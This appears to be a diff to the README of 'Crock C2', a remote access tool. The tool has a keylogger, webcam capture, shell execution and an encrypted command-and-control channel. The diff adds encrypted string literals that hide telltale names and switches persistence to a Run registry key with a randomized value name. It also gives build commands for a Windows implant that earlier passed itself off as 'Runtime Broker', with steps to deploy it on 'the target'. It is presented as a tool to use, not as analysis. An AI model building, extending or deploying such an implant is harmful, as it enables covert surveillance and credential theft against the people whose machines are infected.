@@ -1,10 +1,12 @@
 # Crock C2
 
 Remote access tool with web control panel.
-Python implant compiled with Nuitka.
+Python implant compiled with Nuitka (--standalone).
 Encrypted channel: AES-256-GCM with per-packet nonce.
 Key exchange: X25519 ECDH per session.
 Web panel: JWT authentication with role-based access control.
+String obfuscation: AES-GCM encrypted string literals.
+Persistence: HKCU Run key with randomized value name.
 
 ## Features
 
@@ -13,11 +15,12 @@ Web panel: JWT authentication with role-based access control.
 - Webcam photo
 - Process list
 - Keylogger (start / dump / stop / clear)
-- Screen stream
-- Persistence (scheduled task)
+- Screen stream (stub)
+- Persistence via HKCU Run key (randomized name)
 - AES-256-GCM encrypted channel (per-packet nonce)
 - X25519 ECDH per-session handshake
 - JWT-authenticated web panel with RBAC (viewer / operator / admin)
+- AES-GCM string obfuscation for sensitive literals
 
 ## Requirements
 
@@ -39,11 +42,38 @@ pip install -r requirements.txt
 - implant.py       - implant source
 - server.py        - C2 listener + web server
 - dashboard.html   - web panel (must be next to server.py)
-- login.html       - login page
 - auth.py          - JWT authentication with RBAC
-- crypto layer.py  - AES-256-GCM encryption + X25519 handshake helpers
+- crypto_layer.py  - AES-256-GCM channel + X25519 handshake
+- strings_crypt.py - AES-GCM string obfuscation helpers
 - requirements.txt - Python dependencies
 - chrome.ico       - icon for the build (optional)
+
+## Prepare encrypted strings
+
+Run once on the build host:
+
+python3 - <<'PY'
+from strings_crypt import enc
+for s in [
+    "schtasks",
+    "pynput.keyboard",
+    "socket",
+    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+    "RuntimeBroker",
+]:
+    print(s, "->", enc(s))
+PY
+
+Paste the resulting tokens into implant.py:
+
+_T_SCHTASKS  = "<token for schtasks>"
+_T_PYNPUT    = "<token for pynput.keyboard>"
+_T_SOCKET    = "<token for socket>"
+_T_RUNKEY    = "<token for Software\\Microsoft\\Windows\\CurrentVersion\\Run>"
+_T_RUNNAME   = "<token for RuntimeBroker>"
+
+Replace the value of _T_RUNNAME with a freshly generated random name if
+you want a unique persistence entry per build.
 
 ## Build implant
 
@@ -53,21 +83,17 @@ sudo apt install -y g++-mingw-w64-x86-64
 source venv/bin/activate
 nuitka \
   --standalone \
-  --onefile \
   --mingw64 \
-  --windows-disable-console \
   --windows-company-name="Crock" \
-  --windows-product-name="Runtime Broker" \
-  --windows-file-description="Runtime Broker" \
-  --windows-file-version=10.0.19041.1 \
-  --windows-product-version=10.0.19041.1 \
+  --windows-product-name="Crock" \
+  --windows-file-description="Crock" \
   --windows-icon-from-ico=chrome.ico \
   --enable-plugin=anti-bloat \
   --assume-yes-for-downloads \
-  --remove-output \
   implant.py
 
-Output: implant.exe (rename to anything).
+Output: implant.dist/ with implant.exe and dependencies.
+Run: implant.dist/implant.exe on the target.
 
 ## Run server
 
@@ -103,10 +129,23 @@ Default operators (override with environment variables):
 - Key exchange: X25519 ECDH on connect, session key derived via HKDF-SHA256.
 - No static shared key: each connection uses its own session key.
 
+## String obfuscation
+
+- Sensitive literals are AES-GCM encrypted at build time via strings_crypt.enc.
+- At runtime, strings_crypt.dec restores them only when needed.
+- Master key is embedded in strings_crypt.py.
+- Rotate the master key by editing _MASTER and regenerating all tokens.
+
+## Persistence
+
+- Uses HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
+- Value name is a randomized 12-character string (generated per build).
+- No schtasks dependency.
+
 ## Usage
 
 1. Start server.py.
-2. Run the compiled exe on the Windows machine.
+2. Deploy implant.dist/ to the Windows machine and run implant.exe.
 3. Open http://127.0.0.1:5000 and log in.
 4. Select the client and use the panel.
 
@@ -122,16 +161,16 @@ Default operators (override with environment variables):
 | keylog_dump   | Dump keylogger buffer         |
 | keylog_stop   | Stop keylogger                |
 | keylog_clear  | Clear keylogger buffer        |
-| stream_start  | Start screen stream           |
-| stream_stop   | Stop screen stream            |
-| persist       | Add scheduled task            |
+| stream_start  | Start screen stream (stub)    |
+| stream_stop   | Stop screen stream (stub)     |
+| persist       | Add HKCU Run entry            |
 | sh:<command>  | Execute shell command         |
 
 ## Notes
 
 - Web UI listens only on localhost.
 - Default C2 address is 192.168.122.1:4444.
-- Persistence uses a scheduled task.
+- Persistence uses HKCU Run key with randomized value name.
 - .jwt_secret is created automatically and must not be committed.
 - Recommended .gitignore entries:
   .jwt_secret
